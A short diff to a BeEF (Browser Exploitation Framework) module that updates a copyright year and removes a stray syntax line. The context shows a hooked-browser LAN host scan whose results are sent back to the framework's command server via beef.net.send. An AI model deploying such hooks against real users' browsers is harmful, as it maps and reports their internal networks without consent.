@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -109,7 +109,6 @@ var doScan = function(timeout) {
     } else {
       beef.debug("[command #<%= @command_id %>] Identifying LAN hosts completed.");
       beef.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts, beef.are.status_success());
-);
       beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=scan complete");
     }
   }
